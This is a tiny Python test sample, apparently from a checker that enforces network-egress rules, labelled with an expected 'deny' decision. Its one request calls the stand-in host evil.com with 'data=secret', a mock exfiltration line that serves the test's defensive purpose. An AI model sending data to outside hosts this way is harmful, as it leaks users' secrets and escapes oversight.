# Sample 04 - NETWORK EGRESS: request to a host that is NOT allow-listed.
# Expected decision: deny  (NET_EGRESS_NON_ALLOWLIST, CRITICAL)
import requests

response = requests.get("http://evil.com/collect?data=secret")
print(response.status_code)
